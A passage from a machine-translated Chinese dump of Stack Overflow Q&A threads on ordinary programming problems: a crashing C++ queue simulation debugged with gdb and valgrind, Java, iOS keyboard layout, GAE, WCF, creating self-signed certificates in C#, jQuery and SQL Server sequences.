    return served;
}

int decreaseServeTime()
{
    servicet --;
}

};

int totServed=0;
int queues=0;
int inLine=0;
int totTime=0;
int smallestQueue=0;
int temp=0;
int ran=0;
double mean=0;
int served=0;
int serviceTime=0;
int help=0;
int sim=0;
int n=0;
using namespace std;
int main()
{
cout<<"Number of Cashiers?: "<<endl;
cin >> queues;
cout <<"How long simulation?: "<<endl;
cin >> sim;

list<Customer> *cashiers[queues];
list<Customer> *cust;

for(int i=0; i<=queues; i++)
{
    cust = new list<Customer>;
    cashiers[i] = cust;

}

srand(time(0));
while(n<sim)
{
    Sleep(2000);

    ran= rand()%4;
    smallestQueue = cashiers[0] ->size();

    for(int j=0; j<ran; j++)
    {
        for(int k=0; k<queues; k++)
        {
            temp = cashiers[k]->size();

            if(temp<=smallestQueue)
            {
                smallestQueue = temp;

                help=k;
            }
        }

        Customer C;

        cashiers[help]->push_back(C);
        inLine++;

    }

    for(int i=0; i<queues; i++)
    {
        if(serviceTime>0)
        {

            serviceTime = cashiers[i]->front().getServicetime();
            cashiers[i]->front().decreaseServeTime();

        }
        else if(serviceTime==0)
        {
            cashiers[i]->pop_front();
            served++;
        }
    }

    totTime++;
    int cash=1;
    for(int i=0; i<queues; i++)
    {
        if(inLine!=0)
        {
            cout <<"Kassa: "<<cash<<endl;
            inLine = cashiers[i]->size();
            mean = (totTime/inLine);
            totServed +=served;
            cash++;

        }
         cout <<inLine<<" "<<mean<<" "<<totServed<<endl;
    }

n++;
}

system("pause");

} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-10T17:53:02.597

我建议您使用诸如 Application Verifier 之类的程序来查找导致崩溃的问题：

[http://www.microsoft.com/en-us/download/details.aspx?id=20028](http://www.microsoft.com/en-us/download/details.aspx?id=20028)

学习如何调试软件并了解正在发生的事情非常重要。请在调试器（Visual Studio、Eclipse）中运行您的代码并查看它停止的位置。如果您使用了应用程序验证程序，那么它可能会在问题所在的地方停止。看看变量，看看它们是否有意义。看看你是否正在访问你不应该访问的内存位置。

要将 Application Verifier 与 Visual Studio 一起使用，请安装它，然后在 C:\Windows 的 System32 文件夹中找到 appVerifier.exe。然后打开文件并将其指向您的可执行文件。启用您认为正确的检查。然后在 Visual Studio 中运行它。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-10T18:01:48.943

一个好的起点是调试器（例如`gdb`）。首先，我们在启用调试的情况下编译 ( `g++ -ggdb`) 并尝试在调试器中运行，

```
 $ g++ hi.cpp  -ggdb
 $ gdb ./a.out 
 GNU gdb (GDB) 7.5-ubuntu
 Copyright (C) 2012 Free Software Foundation, Inc.
 License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
 This is free software: you are free to change and redistribute it.
 There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
 and "show warranty" for details.
 This GDB was configured as "x86_64-linux-gnu".
 For bug reporting instructions, please see:
 <http://www.gnu.org/software/gdb/bugs/>...
 Reading symbols from /home/ben/a.out...done.
 (gdb) run
 Starting program: /home/ben/a.out 
 Number of Cashiers?: 
 5
 How long simulation?: 
 5
 Kassa: 1

 Program received signal SIGSEGV, Segmentation fault.
 0x0000000000401827 in std::_List_const_iterator<Customer>::operator++ (
     this=0x7fffffffdd10) at /usr/include/c++/4.7/bits/stl_list.h:236
 236        _M_node = _M_node->_M_next;
 (gdb) backtrace
 #0  0x0000000000401827 in std::_List_const_iterator<Customer>::operator++ (
     this=0x7fffffffdd10) at /usr/include/c++/4.7/bits/stl_list.h:236
 #1  0x0000000000401665 in std::__distance<std::_List_const_iterator<Customer> >
     (__first=..., __last=...)
     at /usr/include/c++/4.7/bits/stl_iterator_base_funcs.h:82
 #2  0x0000000000401492 in std::distance<std::_List_const_iterator<Customer> > (
     __first=..., __last=...)
     at /usr/include/c++/4.7/bits/stl_iterator_base_funcs.h:118
 #3  0x000000000040135b in std::list<Customer, std::allocator<Customer> >::size
     (this=0x604010) at /usr/include/c++/4.7/bits/stl_list.h:855
 #4  0x0000000000401122 in main () at hi.cpp:125 
```

在这里，我们看到程序因`std::list`. 编程一段时间后，您会直觉这可能是由于您的程序踩踏了一些不应该的内存。大致确定了问题的性质后，我们现在将切换到`valgrind`，这是一个专门跟踪此类问题的工具。

```
 $ valgrind ./a.out
 ==13751== Memcheck, a memory error detector
 ==13751== Copyright (C) 2002-2011, and GNU GPL'd, by Julian Seward et al.
 ==13751== Using Valgrind-3.7.0 and LibVEX; rerun with -h for copyright info
 ==13751== Command: ./a.out
 ==13751== 
 Number of Cashiers?: 
 5
 How long simulation?: 
 5
 Kassa: 1
 ==13751== Invalid read of size 8
 ==13751==    at 0x401422: std::list<Customer, std::allocator<Customer> >::begin() const (stl_list.h:749)
 ==13751==    by 0x40134F: std::list<Customer, std::allocator<Customer> >::size() const (stl_list.h:855)
 ==13751==    by 0x401121: main (hi.cpp:125)
 ==13751==  Address 0x5a06040 is 0 bytes inside a block of size 16 free'd
 ==13751==    at 0x4C2A44B: operator delete(void*) (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)
 ==13751==    by 0x4018E7: __gnu_cxx::new_allocator<std::_List_node<Customer> >::deallocate(std::_List_node<Customer>*, unsigned long) (new_allocator.h:100)
 ==13751==    by 0x4017D9: std::_List_base<Customer, std::allocator<Customer> >::_M_put_node(std::_List_node<Customer>*) (stl_list.h:339)
 ==13751==    by 0x4015C0: std::list<Customer, std::allocator<Customer> >::_M_erase(std::_List_iterator<Customer>) (stl_list.h:1549)
 ==13751==    by 0x4013E9: std::list<Customer, std::allocator<Customer> >::pop_front() (stl_list.h:983)
 ==13751==    by 0x40108B: main (hi.cpp:113)
 ==13751== 
 ==13751== 
 ==13751== Process terminating with default action of signal 8 (SIGFPE)
 ==13751==  Integer divide by zero at address 0x402CCCE98
 ==13751==    at 0x40113C: main (hi.cpp:126) 
```

在这里，我们看到`valgrind`告诉我们您的程序尝试对未分配的内存进行读取操作。特别是，这似乎是由于`pop_front`手术而发生的。查看源代码，您确实尝试在`cashiers[i]`没有首先检查它的大小的情况下弹出。

我们可以添加适当的检查，

```
 ...
 else if(serviceTime==0)
 {
     if (!cashiers[i]->empty()) {
         cashiers[i]->pop_front();
         served++;
     }
 }
 ... 
```

然而，崩溃的实际原因是在计算 时除以零 ，如' 输出`mean`末尾所述。`valgrind`这是因为在计算时没有处理no `Customers`are的情况。`inLine``mean`

# java - 在java中过滤文件对象以填充jComboBox

> ID：13806277
> 
> 赞同：-1
> 
> 时间：2012-12-10T17:45:09.277
> 
> 标签：java, swing, filenames, jcombobox

使用下面的代码使用完整路径填充我的 JComboBox。有没有一种简单的方法来过滤它以仅在 JComboBox 中显示文件名本身。

```
 String path = "\\\\intdatserver1\\NY_files";
    File folder = new File(path);
    File[] listOfFiles = folder.listFiles();

    final JComboBox jList1 = new JComboBox(listOfFiles); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T17:50:00.220

我想你可以自己解决，但如果你坚持...

```
List<String> fileNames = new ArrayList<String>();
for (File file : listOfFiles) {
    if (file.isFile()) {
        fileNames.add(file.getName());
    } else if (file.isDirectory()) {
        // handle directory
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T17:50:29.680

您可以使用类中的方法创建一个新`String`数组或`List<String>`仅使用文件名。[`getName()`](http://docs.oracle.com/javase/7/docs/api/java/io/File.html#getName%28%29)[`File`](http://docs.oracle.com/javase/7/docs/api/java/io/File.html)

# ios - 如何找到键盘未覆盖的视图部分（UIModalPresenationStyleFormSheet）？

> ID：13806282
> 
> 赞同：4
> 
> 时间：2012-12-10T17:45:29.357
> 
> 标签：ios, keyboard, modalviewcontroller, screen-rotation, uimodalpresentationstyle

我有一个显示带有 UITextView 的视图的视图控制器，并且我想在键盘出现时调整视图的大小，以便 UITextView 不会被键盘覆盖。我几乎在所有情况下都能正常工作。据我所知，只有当视图控制器以 ModalPresentationStyleFormSheet 呈现并且仅以 LandscapeRight 方向呈现时，我仍然在 iPad 上看到了一些奇怪现象。

我的视图控制器 -keyboardWillShow 的相关部分：

```
// We'll store my frame above the keyboard in availableFrame
CGRect availableFrame = self.view.frame;

// Find the keyboard size
NSDictionary *userInfo = [notification userInfo];
NSValue keyboardFrameScreenValue = userInfo[UIKeyboardFrameBeginUserInfoKey];
CGRect keyboardFrameScreen =  [keyboardFrameScreenValue CGRectValue];
CGRect keyboardFrame = [self.view convertRect:keyboardFrameScreen fromView:nil];
CGSize keyboardSize = keyboardFrame.size;

// Figure out how much of my frame is covered by the keyboard
CGRect screenBounds = [self.view convertRect:[UIScreen mainScreen].bounds
                                    fromView:nil];
CGRect myBoundsScreen = [self.view boundsInWindow]; // See below
CGFloat myBottom = myBoundsScreen.origin.y + myBoundsScreen.size.height;
CGFloat keyboardTop = screenBounds.size.height - keyboardSize.height;
CGFloat lostHeight = myBottom - keyboardTop;
availableFrame.size.height -= lostHeight; 
```

-[UIView boundsInWindow]：

```
- (CGRect)boundsInWindow {
  UIInterfaceOrientation orientation =
    [UIApplication sharedApplication].statusBarOrientation;
  CGRect bounds = [self convertRect:self.bounds toView:self.window];
  if (UIInterfaceOrientationIsLandscape(orientation)) {
    // Swap origin
    CGFloat x = bounds.origin.y;
    bounds.origin.y = bounds.origin.x;
    bounds.origin.x = x;
    // Swap size
    CGFloat width = bounds.size.height;
    bounds.size.height = bounds.size.width;
    bounds.size.width = width;
  }

  return bounds;
} 
```

这在大多数情况下都有效。但是，当我的应用程序处于用户界面方向 LandscapeRight 时，我从 -boundsInWindow 获得的原点比它应该的要低很多。这可能是什么原因造成的？

感谢您的帮助！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2015-08-21T22:49:58.223

威尔的回答是正确的想法，但我不得不对其进行相当多的调整以使其正确

```
extension UIView {
    func heightCoveredByKeyboardOfSize(keyboardSize: CGSize) -> CGFloat {
        let frameInWindow = convertRect(bounds, toView: nil)
        guard let windowBounds = window?.bounds else { return 0 }

        let keyboardTop = windowBounds.size.height - keyboardSize.height
        let viewBottom = frameInWindow.origin.y + frameInWindow.size.height

        return max(0, viewBottom - keyboardTop)
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2015-01-03T07:56:45.617

我想我已经找到了一个相当不错的答案。您可以使用`convertRect:fromView:`方法`UIView`来转换坐标系。

在 swift 代码中，UIKeyboardNotification 调用的选择器看起来像这样：

```
func keyboardWasShown(notification: NSNotification) {
    let info = notification.userInfo!
    let keyboardRect = (info[UIKeyboardFrameEndUserInfoKey]! as NSValue).CGRectValue()

    // Convert the keyboard rect into the view controller's coordinate system
    // The fromView: nil means keyboardRect is in the main window's coordinate system
    let newSize = self.view.convertRect(keyboardRect, fromView: nil)

    // And then this is the part that gets covered!
    let keyboardCoveredHeight = self.view.bounds.height - newSize.origin.y
    // Note: you may have to use self.navigationController!.view.bounds.height if
    // you've wrapped your view in a navigation controller because this will 
    // include the height of the navigation bar

    // You can then adjust the content inset of the text view accordingly
    textView.scrollIndicatorInsets.bottom = keyboardCoveredHeight
    textView.contentInset.bottom = keyboardCoveredHeight
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-06-21T18:50:47.373

以下是我使用 iPad 表单处理键盘的方式：

```
- (void)UIKeyboardDidShowNotification:(NSNotification*)aNotification
{
    NSDictionary *userInfo = [aNotification userInfo];
    CGSize keyboardSize = [userInfo[UIKeyboardFrameBeginUserInfoKey] CGRectValue].size;

    UIEdgeInsets contentInsets = UIEdgeInsetsMake(0.0, 0.0, [self.view heightCoveredByKeyboardOfSize:keyboardSize], 0.0);

    [UIView animateWithDuration:.25f animations:^{
        self.scrollView.contentInset = contentInsets;
        self.scrollView.scrollIndicatorInsets = contentInsets;
    }];
} 
```

UIView 上的类别：

```
- (CGFloat)heightCoveredByKeyboardOfSize:(CGSize)keyboardSize
{
    UIInterfaceOrientation orientation = [UIApplication sharedApplication].statusBarOrientation;
    CGRect frameInWindow = [self convertRect:self.bounds toView:nil];
    CGRect windowBounds = self.window.bounds;

    CGFloat keyboardTop;
    CGFloat heightCoveredByKeyboard;

    //Determine height of the view covered by the keyboard relative to current rotation

    switch (orientation) {
        case UIInterfaceOrientationLandscapeLeft:
            keyboardTop = windowBounds.size.width - keyboardSize.width;
            heightCoveredByKeyboard = CGRectGetMaxX(frameInWindow) - keyboardTop;
            break;
        case UIInterfaceOrientationLandscapeRight:
            keyboardTop = windowBounds.size.width - keyboardSize.width;
            heightCoveredByKeyboard = windowBounds.size.width - frameInWindow.origin.x - keyboardTop;
            break;
        case UIInterfaceOrientationPortraitUpsideDown:
            keyboardTop = windowBounds.size.height - keyboardSize.height;
            heightCoveredByKeyboard = windowBounds.size.height - frameInWindow.origin.y - keyboardTop;
            break;
        default:
            keyboardTop = windowBounds.size.height - keyboardSize.height;
            heightCoveredByKeyboard = CGRectGetMaxY(frameInWindow) - keyboardTop;
            break;
    }

    return MAX(0.0f,heightCoveredByKeyboard);
} 
```

# google-app-engine - Channel API (GAE) 中的消息格式？

> ID：13806290
> 
> 赞同：3
> 
> 时间：2012-12-10T17:45:53.507
> 
> 标签：google-app-engine, channel-api

我正在 GAE 上开发一个 HTML5 协作画布绘图工具。本质上，人们通过通道 API 绘制、发送他们的坐标和他们的动作到 GAE，然后其他人接收更新。

根据 GAE 文档的要求，我的 javascript 代码中有一个函数可以收集从服务器接收到的消息：

```
socket.onmessage= function (message) {
    var s=message.data;
    //Extract X,Y,motion out of s and Draw(x,y,motion)
}; 
```

但是，我发送的消息数据实际上是 x 和 y 坐标和一个字符串（“start”/“drag”），形式为：

```
x=505.0000457763672&y=111.66667175292969&type=start 
```

我实际上不知道这个“消息”类中的任何变量或特性，如果我没有在[其他人的源代码](http://googleappengine.blogspot.hk/2011/02/pushing-updates-with-channel-api.html)中看到它，我也不知道使用“message.data” ——这实际上记录在任何地方吗？我希望能够使用子字符串功能来有效地提取 3 个值，但它们似乎不适用于 message.data。

知道消息类的完整成员函数/类/变量文档是否有详细文档吗？

非常感谢任何输入！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T18:31:24.430

我不会说它记录得很好，但它记录在通道 API 文档中： [https ://developers.google.com/appengine/docs/python/channel/javascript](https://developers.google.com/appengine/docs/python/channel/javascript)

它确实说消息对象有一个名为“数据”的参数。

您应该能够很好地使用 javascript 子字符串功能，但是除非您显示您的代码，否则没有人可以帮助您。

# wcf - WCF NetTcpBinding 通道缓存

> ID：13806291
> 
> 赞同：1
> 
> 时间：2012-12-10T17:45:55.673
> 
> 标签：wcf, nettcpbinding

我们有一个服务可以让 NetTcp 调用不同服务器上的其他服务。我试图通过缓存 ChannelFactories 和增加 maxOutboundConnectionsPerEndpoint 来优化它。

我一直在使用 GOOGLE.COM（顺便说一句，这是一个很棒的网站。如果您没有听说过它们，请查看）来尝试了解频道缓存的工作原理，但我认为我的说法不正确。

重用通道工厂 - 好主意。自己缓存频道 - 坏主意。Wcf 已经这样做了，只要您的所有频道都是从同一个工厂创建的。- 那正确吗？如果每次都新建一个工厂，不缓存？

```
 // factory initialization
    var address = "net.tcp://something:8888/testservices";
    var factory = new ChannelFactory<ITestService>("configname", new EndpointAddress(address));

    // do stuff
    var client = factory.CreateChannel(); // you can also pass an address here. how does that effect channel caching? 
```

这样就可以处理工厂的东西了。现在，我想增加 maxOutboundConnectionsPerEndpoint，这是通过自定义绑定实现的。尚不清楚的是GroupName。我无法在配置中指定不同的组名，因为我在运行时查找 URL。因此，所有通道工厂都将具有相同的默认组名。他们要共享同一个池吗，每个工厂都有自己的吗？

最后，我想在配置中创建自定义绑定，然后根据需要创建/缓存多个通道工厂，并使用它们来建立通道。而且，我需要增加每个端点的 maxOutboundConnectionsPerEndpoint。我可能会在 20 台不同的机器上调用相同的服务，并且我希望每台机器最多有 50 个缓存通道。上面的代码实现了吗？

谢谢您的帮助。如果有涵盖此内容的链接，请转发。我一直没能找到它。

# c# - 如何使用 C# 创建自签名证书？

> ID：13806299
> 
> 赞同：84
> 
> 时间：2012-12-10T17:46:24.083
> 
> 标签：c#, .net, certificate, self-signed

我需要使用 C# 创建一个自签名证书（用于本地加密 - 它不用于保护通信）。

我见过一些使用[P/Invoke](http://www.daveamenta.com/2008-05/what-is-pinvoke-pinvoke/)和[Crypt32.dll](http://msdn.microsoft.com/en-us/library/windows/desktop/aa379884%28v=vs.85%29.aspx)的实现，但它们很复杂，而且很难更新参数——而且我也想尽可能避免使用 P/Invoke。

我不需要跨平台的东西——只在 Windows 上运行对我来说已经足够了。

理想情况下，结果将是一个 X509Certificate2 对象，我可以使用它来插入 Windows 证书存储或导出到[PFX](https://en.wikipedia.org/wiki/X.509#Certificate_filename_extensions)文件。

* * *

## 回答 #1

> 赞同：94
> 
> 时间：2018-09-27T10:44:29.477

[从 .NET 4.7.2 开始，您可以使用System.Security.Cryptography.X509Certificates.CertificateRequest](https://docs.microsoft.com/en-us/dotnet/api/system.security.cryptography.x509certificates.certificaterequest?view=netframework-4.7.2)创建自签名证书。

例如：

```
using System;
using System.IO;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;

public class CertificateUtil
{
    static void MakeCert()
    {
        var ecdsa = ECDsa.Create(); // generate asymmetric key pair
        var req = new CertificateRequest("cn=foobar", ecdsa, HashAlgorithmName.SHA256);
        var cert = req.CreateSelfSigned(DateTimeOffset.Now, DateTimeOffset.Now.AddYears(5));

        // Create PFX (PKCS #12) with private key
        File.WriteAllBytes("c:\\temp\\mycert.pfx", cert.Export(X509ContentType.Pfx, "P@55w0rd"));

        // Create Base 64 encoded CER (public key only)
        File.WriteAllText("c:\\temp\\mycert.cer",
            "-----BEGIN CERTIFICATE-----\r\n"
            + Convert.ToBase64String(cert.Export(X509ContentType.Cert), Base64FormattingOptions.InsertLineBreaks)
            + "\r\n-----END CERTIFICATE-----");
    }
} 
```

* * *

## 回答 #2

> 赞同：81
> 
> 时间：2012-12-10T17:46:24.083

此实现使用`CX509CertificateRequestCertificate`COM 对象（和朋友 - [MSDN doc](http://msdn.microsoft.com/en-us/library/windows/desktop/aa377124%28v=vs.85%29.aspx)）`certenroll.dll`来创建自签名证书请求并对其进行签名。

下面的示例非常简单（如果您忽略此处发生的一些 COM 内容），并且有一些代码部分确实是可选的（例如 EKU），它们仍然非常有用且易于使用适应您的使用。

```
public static X509Certificate2 CreateSelfSignedCertificate(string subjectName)
{
    // create DN for subject and issuer
    var dn = new CX500DistinguishedName();
    dn.Encode("CN=" + subjectName, X500NameFlags.XCN_CERT_NAME_STR_NONE);

    // create a new private key for the certificate
    CX509PrivateKey privateKey = new CX509PrivateKey();
    privateKey.ProviderName = "Microsoft Base Cryptographic Provider v1.0";
    privateKey.MachineContext = true;
    privateKey.Length = 2048;
    privateKey.KeySpec = X509KeySpec.XCN_AT_SIGNATURE; // use is not limited
    privateKey.ExportPolicy = X509PrivateKeyExportFlags.XCN_NCRYPT_ALLOW_PLAINTEXT_EXPORT_FLAG;
    privateKey.Create();

    // Use the stronger SHA512 hashing algorithm
    var hashobj = new CObjectId();
    hashobj.InitializeFromAlgorithmName(ObjectIdGroupId.XCN_CRYPT_HASH_ALG_OID_GROUP_ID,
        ObjectIdPublicKeyFlags.XCN_CRYPT_OID_INFO_PUBKEY_ANY, 
        AlgorithmFlags.AlgorithmFlagsNone, "SHA512");

    // add extended key usage if you want - look at MSDN for a list of possible OIDs
    var oid = new CObjectId();
    oid.InitializeFromValue("1.3.6.1.5.5.7.3.1"); // SSL server
    var oidlist = new CObjectIds();
    oidlist.Add(oid);
    var eku = new CX509ExtensionEnhancedKeyUsage();
    eku.InitializeEncode(oidlist); 

    // Create the self signing request
    var cert = new CX509CertificateRequestCertificate();
    cert.InitializeFromPrivateKey(X509CertificateEnrollmentContext.ContextMachine, privateKey, "");
    cert.Subject = dn;
    cert.Issuer = dn; // the issuer and the subject are the same
    cert.NotBefore = DateTime.Now;
    // this cert expires immediately. Change to whatever makes sense for you
    cert.NotAfter = DateTime.Now; 
    cert.X509Extensions.Add((CX509Extension)eku); // add the EKU
    cert.HashAlgorithm = hashobj; // Specify the hashing algorithm
    cert.Encode(); // encode the certificate

    // Do the final enrollment process
    var enroll = new CX509Enrollment();
    enroll.InitializeFromRequest(cert); // load the certificate
    enroll.CertificateFriendlyName = subjectName; // Optional: add a friendly name
    string csr = enroll.CreateRequest(); // Output the request in base64
    // and install it back as the response
    enroll.InstallResponse(InstallResponseRestrictionFlags.AllowUntrustedCertificate,
        csr, EncodingType.XCN_CRYPT_STRING_BASE64, ""); // no password
    // output a base64 encoded PKCS#12 so we can import it back to the .Net security classes
    var base64encoded = enroll.CreatePFX("", // no password, this is for internal consumption
        PFXExportOptions.PFXExportChainWithRoot);

    // instantiate the target class with the PKCS#12 data (and the empty password)
    return new System.Security.Cryptography.X509Certificates.X509Certificate2(
        System.Convert.FromBase64String(base64encoded), "", 
        // mark the private key as exportable (this is usually what you want to do)
        System.Security.Cryptography.X509Certificates.X509KeyStorageFlags.Exportable
    );
} 
```

可以使用这些方法将结果添加到证书存储`X509Store`或导出`X509Certificate2`。

对于完全托管且不依赖于 Microsoft 平台，并且如果您对 Mono 的许可没问题，那么您可以查看[Mono.Security](http://www.mono-project.com/Cryptography#Assembly:_Mono.Security)中的[X509CertificateBuilder](http://code.ohloh.net/file?fid=hlZXds9VgYcE3MIgdWJfVBrCE-o&cid=oX7t2cSLUiM&s=X509CertificateBuilder&mp=1&ml=1&me=1&md=1&browser=Default#L2)。Mono.Security 独立于 Mono，因为它不需要 Mono 的其余部分来运行，并且可以在任何兼容的 .Net 环境中使用（例如 Microsoft 的实现）。

* * *

## 回答 #3

> 赞同：20
> 
> 时间：2012-12-12T00:31:57.743

另一种选择是使用 CodePlex 的[CLR 安全扩展库](https://github.com/MicrosoftArchive/clrsecurity)，它实现了一个辅助函数来生成自签名 X.509 证书：

```
X509Certificate2 cert = CngKey.CreateSelfSignedCertificate(subjectName); 
```

您还可以查看该函数的实现（在 中[`CngKeyExtensionMethods.cs`](https://github.com/microsoftarchive/clrsecurity/blob/master/Security.Cryptography/src/CngKeyExtensionMethods.cs)），以了解如何在托管代码中显式创建自签名证书。

* * *

## 回答 #4

> 赞同：11
> 
> 时间：2012-12-10T23:04:06.617

您可以使用免费的[PluralSight.Crypto 库](http://blog.pluralsight.com/selfcert-create-a-self-signed-certificate-interactively-gui-or-programmatically-in-net)来简化自签名 X.509 证书的编程创建：

```
 using (CryptContext ctx = new CryptContext())
    {
        ctx.Open();

        X509Certificate2 cert = ctx.CreateSelfSignedCertificate(
            new SelfSignedCertProperties
            {
                IsPrivateKeyExportable = true,
                KeyBitLength = 4096,
                Name = new X500DistinguishedName("cn=localhost"),
                ValidFrom = DateTime.Today.AddDays(-1),
                ValidTo = DateTime.Today.AddYears(1),
            });

        X509Certificate2UI.DisplayCertificate(cert);
    } 
```

PluralSight.Crypto 需要 .NET 3.5 或更高版本。

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2020-08-24T13:02:17.360

如果它对其他人有帮助，我需要使用[Duncan Smart 的答案](https://stackoverflow.com/a/52535184/843387)生成 PEM 格式的测试证书（因此需要 crt 和密钥文件） ，我制作了以下内容......

```
public static void MakeCert(string certFilename, string keyFilename)
{
    const string CRT_HEADER = "-----BEGIN CERTIFICATE-----\n";
    const string CRT_FOOTER = "\n-----END CERTIFICATE-----";

    const string KEY_HEADER = "-----BEGIN RSA PRIVATE KEY-----\n";
    const string KEY_FOOTER = "\n-----END RSA PRIVATE KEY-----";

    using var rsa = RSA.Create();
    var certRequest = new CertificateRequest("cn=test", rsa, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);

    // We're just going to create a temporary certificate, that won't be valid for long
    var certificate = certRequest.CreateSelfSigned(DateTimeOffset.Now, DateTimeOffset.Now.AddDays(1));

    // export the private key
    var privateKey = Convert.ToBase64String(rsa.ExportRSAPrivateKey(), Base64FormattingOptions.InsertLineBreaks);

    File.WriteAllText(keyFilename, KEY_HEADER + privateKey + KEY_FOOTER);

    // Export the certificate
    var exportData = certificate.Export(X509ContentType.Cert);

    var crt = Convert.ToBase64String(exportData, Base64FormattingOptions.InsertLineBreaks);
    File.WriteAllText(certFilename, CRT_HEADER + crt + CRT_FOOTER);
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2021-05-21T13:48:23.557

根据此处找到的代码使用**SubjectAlternativeNames**扩展[0909EM 答案](https://stackoverflow.com/a/63561595/226278)： [Understanding self-signed certificate in c#](https://stackoverflow.com/questions/62892761/understanding-self-signed-certificates-in-c-sharp)

 **```
 public static void MakeCert(string certFilename, string keyFilename)
        {
            const string CRT_HEADER = "-----BEGIN CERTIFICATE-----\n";
            const string CRT_FOOTER = "\n-----END CERTIFICATE-----";

            const string KEY_HEADER = "-----BEGIN RSA PRIVATE KEY-----\n";
            const string KEY_FOOTER = "\n-----END RSA PRIVATE KEY-----";

            using var rsa = RSA.Create();
            var certRequest = new CertificateRequest("cn=test", rsa, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);

            // Adding SubjectAlternativeNames (SAN)
            var subjectAlternativeNames = new SubjectAlternativeNameBuilder();
            subjectAlternativeNames .AddDnsName("test");
            certRequest.CertificateExtensions.Add(subjectAlternativeNames.Build());

            // We're just going to create a temporary certificate, that won't be valid for long
            var certificate = certRequest.CreateSelfSigned(DateTimeOffset.Now, DateTimeOffset.Now.AddDays(1));

            // export the private key
            var privateKey = Convert.ToBase64String(rsa.ExportRSAPrivateKey(), Base64FormattingOptions.InsertLineBreaks);

            File.WriteAllText(keyFilename, KEY_HEADER + privateKey + KEY_FOOTER);

            // Export the certificate
            var exportData = certificate.Export(X509ContentType.Cert);

            var crt = Convert.ToBase64String(exportData, Base64FormattingOptions.InsertLineBreaks);
            File.WriteAllText(certFilename, CRT_HEADER + crt + CRT_FOOTER);
        } 
```

对于使用键的定义，`X509KeyUsageExtension`请看这里[https://stackoverflow.com/a/48210587/226278](https://stackoverflow.com/a/48210587/226278)

* * *

## 回答 #7

> 赞同：-2
> 
> 时间：2017-05-27T15:17:05.513

这是关于如何创建证书的 Powershell 版本。您可以通过执行命令来使用它。检查[https://technet.microsoft.com/itpro/powershell/windows/pkiclient/new-selfsignedcertificate](https://technet.microsoft.com/itpro/powershell/windows/pkiclient/new-selfsignedcertificate)

编辑：忘了说创建证书后，您可以使用 Windows“管理计算机证书”程序，将证书导出为 .CER 或其他类型。**

# jquery - fadeIn 使用 livequery 响应，使用 setInterval 的自动 ajax 调用不淡入

> ID：13806301
> 
> 赞同：0
> 
> 时间：2012-12-10T17:46:28.070
> 
> 标签：jquery, ajax, livequery

好吧，大佬们，问题来了。我正在我的网站上进行自动更新（使用 ajax），以加载自 dom 加载以来可能已发布的任何新评论。该脚本工作正常，因为在新评论中将使用 ajax 调用加载；但是，我希望使用 jquery 对 fadeIn 的调用做出响应。我在其他地方使用此代码`$(response).hide().prependTo('.ideas').fadeIn('slow');`，它工作正常。我相信它在其他地方也有效，因为我正在使用该`.on()`方法，但我不能在这里使用它，因为我没有使用任何类型的用户操作来触发事件。

这是当前代码：

`setInterval(function() {`

 ````
 if (window.location.pathname == "/" || window.location.pathname == "/appreciate" || window.location.pathname == "/appreciate#") {
        var first_message = $('.messages > div.message_wrapper:first').attr('id');
        var pathname = window.location.pathname;
         $.ajax({
            type: "POST",
            url: "/update_comments.php",
            data: {first_message: first_message, pathname: pathname},
            success: function (response) {
                $(response).hide().prependTo('.messages').fadeIn(2000);
            }
        });

    } else {
        var first_idea = $('.ideas > div.message_wrapper:first').attr('id');
         $.ajax({
            type: "POST",
            url: "/update_comments.php",
            data: {first_idea: first_idea, pathname: pathname},
            success: function (response) {
                $(response).hide().prependTo('.ideas').fadeIn(2000);
            }
        });
    }

}, 20000); 
````  `有什么想法吗？我考虑过使用 livequery，我在其他地方看到你可以定义 livequery 查找的 jquery 方法，所以我把它放在我的代码中 `$.livequery.registerPlugin('append', 'prepend', 'after', 'before', 'wrap', 'attr', 'removeAttr', 'addClass', 'removeClass', 'toggleClass', 'empty', 'remove', 'appendTo', 'prependTo');`但它没有做任何事情。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-10T17:57:18.593

好吧……我解决了。

```
$('.messages').livequery(function () {
    $(response).hide().prependTo('.messages').fadeIn(2000);
}); 
```

通过`success:`在`.messages`div 上添加 livequery，我能够添加淡入淡出效果。`

# sql-server-2008 - 在不同的会话中使用 UPDATE 语句增加数字是否可靠？

> ID：13806302
> 
> 赞同：1
> 
> 时间：2012-12-10T17:46:33.747
> 
> 标签：sql-server-2008, tsql, isolation-level

使用默认隔离级别：READ COMMITTED，是否可以保证以下过程为每个会话返回不同的数字？基本上，一个会话是否可以与另一个会话同时执行此过程，并返回相同的值。

```
CREATE PROCEDURE GetNextVersion(@id uniqueidentifier)
AS
BEGIN
    UPDATE MySequenceTable
        SET mySequenceField = mySequenceField + 1 
    OUTPUT INSERTED.mySequenceField
    where IdField = @id
END
GO 
```

**注意：**我们不能在 SQL Server 2012 中使用新的序列对象，这也不是标识列可以工作的场景。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T19:00:21.850

如果您在一个语句中获取和设置值而不使用输出子句，则无论隔离级别如何，它都是唯一的（假设没有错误。）

```
CREATE PROCEDURE GetNextVersion
@id uniqueidentifier,
@mySequenceField int output
AS
BEGIN
UPDATE MySequenceTable
SET @mySequenceField = mySequenceField,  mySequenceField + 1 
where IdField = @id
END
GO 
```

请注意，变量将首先更新，因此表中的下一个序列值已经增加。

另外为什么你在where子句中有一个id？如果 MySequenceTable 只有一行，这不会很好吗？

# powershell - 在搜索中过滤掉子OU

> ID：13806303
> 
> 赞同：5
> 
